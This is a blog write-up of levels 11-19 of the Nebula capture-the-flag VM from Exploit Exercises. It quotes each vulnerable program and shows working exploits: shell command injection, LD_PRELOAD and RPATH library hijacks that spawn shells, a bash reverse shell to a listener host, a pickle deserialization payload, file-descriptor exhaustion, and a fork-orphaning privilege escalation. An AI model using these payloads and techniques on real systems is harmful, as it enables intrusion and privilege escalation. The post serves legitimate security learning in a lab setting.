---
extends: default.liquid
title: Cracking Nebula Part 2
date: 2014-07-02T21:03:50Z
---

On [Exploit Exercises](https://www.exploit-exercises.com/) you can find a number of CTF (Capture The Flag) VM images where you can practice your exploiting, hacking and general computer savviness. I've been working my way through the Nebula machine and figured I might as well write up the process both for other's benefit if they get stuck, and also as a sort of diary for myself, so I can refer back to any info if I need to.

This continues on from [part 1](/posts/2014-06-24-cracking-nebula-part1/).

## Level 11

> The /home/flag11/flag11 binary processes standard input and executes a shell command.
>
> There are two ways of completing this level, you may wish to do both :-)

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
    'A' + (random() % 26), '0' + (random() % 10),
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));

  if(length < sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
      err(1, "fread length");
    }
    process(buf, length);
  } else {
    int blue = length;
    int pink;

    fd = getrand(&path);

    while(blue > 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink <= 0) {
        err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
    }

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
      err(1, "mmap");
    }
    process(mem, length);
  }

}
```

I'll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn't get it to work. After some searching I believe it's down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: [https://www.kroosec.com/2012/11/nebula-level11.html](https://www.kroosec.com/2012/11/nebula-level11.html)

## level 12

> There is a backdoor process listening on port 50001.

```
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print("trying " .. line) -- log from where ;\
    local h = hash(line)

    if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
    else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
    end

  end

  client:close()
end
```

So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don't get our token. With a specially crafted password however, we can make use of the `io.popen` call.

```
level12@nebula:/home/flag12$ nc localhost 50001
Password: hello && getflag > /tmp/out
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/out
You have successfully executed getflag on a target account
```

## Level 13

> There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
    printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
    printf("The system administrators will be notified of this violation\n");
    exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);

}
```

Here we need to fake our UID. Sounds tricky. Actually, we don't fake our UID, we fake the call to `getuid`. How? `getuid` is called from a library, which means we are able to replace it with our own library. Let's take a look at the function definition of `getuid`

```text
GETUID(2)                  Linux Programmer's Manual                 GETUID(2)

NAME
       getuid, geteuid - get user identity

SYNOPSIS
       #include <unistd.h>
       #include <sys/types.h>

       uid_t getuid(void);
       uid_t geteuid(void);
```

Ok, so let's write our verison of:

```C
#include <sys/types.h>

uid_t getuid(void) { return 1000; }
```

and compile it as a shared library which we then preload (see `man ld.so` for more info on this). We need to copy the `flag13` binary to our local directory because it needs to be run as the same user level as the library we are trying to preload.

```text
level13@nebula:/tmp$ gcc -shared -fPIC fake.c -o fetgetuid.so
level13@nebula:/tmp$ cp ~flag13/flag13 .
level13@nebula:/tmp$ export LD_PRELOAD=/tmp/fetgetuid.so
level13@nebula:/tmp$ ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:/tmp$ ssh flag13@localhost
flag13@localhost's password: b705702b-76a8-42b0-8844-3adabbe5ac58
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 14

> This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)

The contents of `token` were encrypted using the `flag14` binary in `~flag14`. If you run it you can see how it works. Let's enter something and see if we can work out how it works. I created a file with the contents `abcdefghijklmno` in `/tmp/test`

```C
level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
```

> <acegikmoqsuwy%7B%7Dlevel14@nebula>:/home/flag14$

So luckily it's fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.

```python
import sys

def decrypt(input):
  out = '' for i, c in enumerate(input): dec = ord(c) - i out += chr(dec)

  print out

if __name__ == '__main__':
  input = sys.argv[1] print input decrypt(input)
```

And now pipe the token into it

```
level14@nebula:/home/flag14$ python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ ssh flag14@localhost

flag14@localhost's password: 8457c118-887c-4e40-a5a6-33a25353165

flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 15

> strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
>
> You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
>
> Clean up after yourself :)

After running `strace` we notice this particular bit

```
level15@nebula:/home/flag15$ strace ./flag15
.
.
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfdb8ba4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
.
.
```

It's trying to load libc.so.6 from a specific location. Why is that? Let's use `readelf` to take a look

```
evel15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 .
 .
 .
```

So it's got an `RPATH` to that location and as luck would have it we have write permissions to it. I guess we can create our own `libc.so.6` in that directory and use it to execute some code - like get ourselves a flag15 shell. Let's take a look at what symbols we're actually using

```
level15@nebula:/home/flag15$ objdump -R flag15

flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
```

So we've got a choice here between `__libc_start_main` or `__gmon_start`. As I am more comfortable with `__libc_start_main` I'm going to go with this.

So let us begin with the code for our library by looking up the [function declaration](https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html)

```c
#include <linux/unistd.h>

int __libc_start_main(int (*main) (int, char **, char **),
int argc, char *argv, void (*init) (void), void (*fini)
(void), void (*rtld_fini) (void), void *stack_end) {
  system("/bin/sh");
}
```

In theory we should get a shell now

```
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

Nuts, we have a symbol missing, namely `__cxa_finalize`. Let's add it an try again

```C
#include <linux/unistd.h>

void __cxa_finalize (void *d) {
    return;
}

int __libc_start_main(int (*main) (int, char **, char **),
int argc, char *argv, void (*init) (void), void (*fini)
(void), void (*rtld_fini) (void), void *stack_end) {
    system("/bin/sh");
}
```

```
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux's demands. I searched around and found out about [version scripts](https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html). Let's hope it works

```
level15@nebula:/var/tmp/flag15$ cat version
GLIBC_2.0 { };
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script=version
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

_sigh_ - symbol `system` is missing. Ok, let's just build it statically and wrap it all up so we've got everything we need. From `man gcc`

> **-static-libgcc**
> On systems that provide libgcc as a shared library, these options force the use of either the shared or static version respectively. If no shared version of libgcc was built when the compiler was configured, these options have no effect.
>
> So really we can also get rid of our implementation of `__cxa_finalize` as it's all statically linked now.

```
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ whoami
flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 16

> There is a perl script running on port 1616.

```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/;  # conver to uppercase
  $username =~ s/\s.*//;    # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
    ($usr, $pw) = split(/:/, $line);


    if($pw =~ $password) {
      return 1;
    }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
    print("Your login was accepted<br/>");
  } else {
    print("Your login failed<br/>");
  }
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

So quickly looking at the script we know that we need to pass `username` and `password` in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called `userdb.txt`. Taking a look at this file we notice it's empty, so we need a different exploit. The obvious place here is the `egrep` call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.

One idea is to use bash's feature that allows us to run a command with a wildcard in the path. For example you can run `/bin/ls` with `/*/ls` instead. This gets us around the uppercase limitation as we can create an uppercase command at a path we can write to. I've chosen `/tmp` as my target. I'm going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run

```
level16@nebula:~$ nc -l 1337
```

To create a netcat listener on port _1337_

Next I construct the payload for the script

```
level16@nebula:/home/flag16$ cat /tmp/RSHELL
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.101/1337 0>&1
level16@nebula:/home/flag16$ chmod +x /tmp/SHELL
```

Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.

```
https://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%60&password=test2
```

Back in the shell where we launched the netcat listener we do the following (the `whoami` is just to confirm I am the right user)

```
level16@nebula:~$ nc -l 1337
bash: no job control in this shell
flag16@nebula:/home/flag16$ getflag
getflag
You have successfully executed getflag on a target account
flag16@nebula:/home/flag16$ whoami
whoami
flag16
```

## Level 17

> There is a python script listening on port 10007 that contains a vulnerability.

```python
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
    clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
    clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
    server(clnt)
    exit(1)
```

Here pickle provides us with the possibility of an exploit to run our own code. There's lots to read on the security issues with pickle, but to be fair it was never meant to be secure in itself. \[BH_US_11_Slaviero_Sour_Pickles_WP.pdf\](<https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>) and [BH_US_11_Slaviero_Sour_Pickles_Slides.pdf](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf) are a good source for more info.

Right, so my plan is to get a shell as _flag17_ and get the flag from there. Using pickle's opcodes I can construct a string that will run `getflag` from the `pickle.loads` call as user _flag17_. So before I started constructing this I copied the script and ran it as _level17_ on a different port in order to debug and see what's going on. Once I was happy with my exploit code I changed the port to `10007` and ran it to get the flag.

```python
#!/bin/python
import socket

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.connect(('localhost', 10007))
print skt
data = skt.recv(1024)
print data
sent = skt.send("cos\nsystem\n(S'/bin/bash -c /bin/getflag > /tmp/f17pwned'\ntR\n")
print sent
data = skt.recv(1024)
print data
skt.close()
```

I'll explain the pickle string a bit:

- `cos\nsystem` resolves the classname and calls it
- `(` is the marker
- `S'/bin/bash -c /bin/getflag > /tmp/f17pwned'\n` this is our command we want to run
- `tR\n` - `t` puts the string onto the stack and `R` pops this tuple and calls it, thus executing our lovingly crafted payload.

Once run it looks like it worked so let's be sure

```C
level17@nebula:/tmp/flag17$ cat ../f17pwned
You have successfully executed getflag on a target account
```

## Level 18

> Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;
  }
  dprintf("logged in successfully (with%s password file)\n",
    fp == NULL ? "out" : "");

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
    switch(c) {
      case 'd':
        globals.debugfile = fopen(optarg, "w+");
        if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
        setvbuf(globals.debugfile, NULL, _IONBF, 0);
        break;
      case 'v':
        globals.verbose++;
        break;
    }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
    char line[256];
    char *p, *q;

    q = fgets(line, sizeof(line)-1, stdin);
    if(q == NULL) break;
    p = strchr(line, '\n'); if(p) *p = 0;
    p = strchr(line, '\r'); if(p) *p = 0;

    dvprintf(2, "got [%s] as input\n", line);

    if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
    } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
        execve("/bin/sh", argv, envp);
        err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
    } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
    } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
    } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
    }
  }

  return 0;
}
```

This is quite a lot a of code, but let's see what it does. The program accepts two arguments `-v` and `-d` which increase verbosity level and set a debug file respectively. If you launch it with `flag18 -v -v -v -d /tmp/debug` and then `tail -f /tmp/debug` you can see what's going on. I used 3 `-v` because that's the max debug level to be sure to capture everything.

Once it's running there's a number of commands we can issue. These are probably going to give us something to poke around with. We can try to get a shell with the _shell_ command, but that means we need to be logged in. I'll make a note of that. The `setuser` function has a fixed sized buffer. Let's try to overflow that

```
level18@nebula:/home/flag18$ python -c "print('setuser ' + 'A'*128)" | ./flag18 -v -v -v -d /tmp/flag18/debug
*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]
./flag18[0x8048bb1]
======= Memory map: ========
005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072b000-0072e000 rw-p 00000000 00:00 0
0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]
00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]
b7832000-b7833000 rw-p 00000000 00:00 0
b783b000-b783e000 rw-p 00000000 00:00 0
bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]
Aborted
```

This led me to learn about [stack canaries](https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries), and with this we're out of luck (for a simple solution). This means the code has been compiled with _FORTIFY_SOURCE_ and this also going to prevent string formatting exploits in the `notsupported` function.

```
level18@nebula:/home/flag18$ ./flag18 -v -v -v -d /tmp/flag18/debug
site exec %n
*** %n in writable segment detected ***
Aborted
```

Yup. In the process of researching this I also discovered a neat tool called [checksec.sh](https://trapkit.de/tools/checksec.html) that can help identify these compiler options early on.

So what have we got left? The function that checks the password file. If it's not actually able to find the password file, it will log us in. Unfortunately we're not able to delete it. However we can make the `fopen` call fail another way. This error has happened a lot at work where we often deal with a lot of files being open on a single system. Linux systems have a limit as to how many filedescriptors it can have open at any one time. Because the tool doesn't close the file descriptors until you call `closelog`, we can just keep opening files until we hit the limit. Let's see what that limit is.

```
level18@nebula:/home/flag18$ ulimit -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1817
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 1817
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```

_1024_ is the limit. So let's open 1024 files and see what happens. As we have a few file descriptors open already we just need to open 1021 more.

```
level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'shell')" | ./flag18 -v -d /tmp/flag18/debug
./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

Ah, so many file descriptors we can't open any more, not even to shared libraries. We can close one and see how that goes.

```
level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'closelog\n' + 'shell')" | ./flag18 -v -d /tmp/flag18/debug
./flag18: -d: invalid option
Usage:  ./flag18 [GNU long option] [option] ...
    ./flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      (invocation only)
    -abefhkmnptuvxBCHP or -o option
```

Right, so we need to remember that we're running `sh` here, and our arguments are being passed to it. Unfortunately `-d` and such are not valid here. Time to read the manual....

> **--rcfile file**
>
> Execute commands from file instead of the system wide initialization file /etc/bash.bashrc and the standard personal initialization file ~/.bashrc if the shell is interactive (see INVOCATION below).

Ok, well, it's worth a shot.

```
level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'closelog\n' + 'shell')" | ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- '-'
./flag18: invalid option -- 'r'
./flag18: invalid option -- 'c'
./flag18: invalid option -- 'f'
./flag18: invalid option -- 'i'
./flag18: invalid option -- 'l'
./flag18: invalid option -- 'e'
/tmp/flag18/debug: line 1: Starting: command not found
/tmp/flag18/debug: line 2: syntax error near unexpected token `('
/tmp/flag18/debug: line 2: `logged in successfully (without password file)'
```

Heavens, it worked - sort of. Notice the _/tmp/flag18/debug: line 1: Starting: command not found_? That's because our _rcfile_ is set to be our debug file. So it writes to the debug file and then the shell will try to execute it. As we know the first line in the file is _Starting up. Verbose level = 1_, so all we really need to do to quash that error we need to create an executable with that name. Inside that we will run out beloved `getflag`

```
level18@nebula:/home/flag18$ echo getflag > /tmp/Starting
level18@nebula:/home/flag18$ chmod +x !$
chmod +x /tmp/Starting
level18@nebula:/home/flag18$ export PATH=${PATH}:/tmp
level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'closelog\n' + 'shell')" | ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- '-'
./flag18: invalid option -- 'r'
./flag18: invalid option -- 'c'
./flag18: invalid option -- 'f'
./flag18: invalid option -- 'i'
./flag18: invalid option -- 'l'
./flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/flag18/debug: line 2: syntax error near unexpected token `('
/tmp/flag18/debug: line 2: `logged in successfully (without password file)'
```

The harder ways are beyond what I can do, but for those interested in circumventing FORTIFY_SOURCE you can read [A Eulogy for Formatting Strings](https://phrack.org/issues/67/9.html). I'll be re-reading that for sure.

## Flag 19

> There is a flaw in the below program in how it operates.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
    printf("Unable to check parent process\n");
    exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
    /* If root started us, it is ok to start the shell */

    execve("/bin/sh", argv, envp);
    err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

So we can get the shell we want if we can run this as root. How can we do that? This exploits involves a knowledge of Linux forks. Basically if a process forks and the parent dies, the child will automatically be run under `init`. This is called [Fork off and die](https://wiki.linuxquestions.org/wiki/Fork_off_and_die). So who does init run as?

```
level19@nebula:/tmp/flag19$ ps aux | grep init
root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init
```

In order to make use of this we need to run `flag18` as a forked process and then kill the parent. The arguments to `flag18` are passed onto the shell it executes, and thus we can make use of this. I'll write some C code to fork the `flag18` process to which we will pass the `getflag`. It should work.

```C
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
    int childPID = fork();
    if(childPID >= 0) { // forked
        if(childPID == 0) { // child
            sleep(1);
            setresuid(geteuid(),geteuid(),geteuid());
            char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
            execve("/home/flag19/flag19", args, envp);
        }
    }
    return 0;
}
```

Get the idea? Right, let's taste this pudding

```
level19@nebula:/tmp/flag19$ gcc forkit.c -o forkit
level19@nebula:/tmp/flag19$ ./forkit
level19@nebula:/tmp/flag19$ You have successfully executed getflag on a target account
```

**Nebula done.**

## Closing words

Firstly: Thanks for taking the time to read this. Please leave any feedback or comments below (or twitter/email if you prefer).

Secondly: If you are here because you are also playing _Nebula_ and are new to this like I am, this write up might seem like magic. You're struggling to figure out how to get past a certain level and then this text makes it seem like magic.

It's not like that. I spent a lot of time working through the later levels as I quickly learned how little I knew. Much time was spent researching and learning about things I thought I already knew. Turns out I knew very little about them. There were a lot of failures on the way, but if I kept those in, this post would be much much longer. The thought process seems very simple in write ups, but trust me, there's quite a bit of puzzling and thinking to do.

It's early days for me too, and I very much enjoyed _Nebula_, and have a whole new set of tools and ideas in my arsenal for the next challenge.
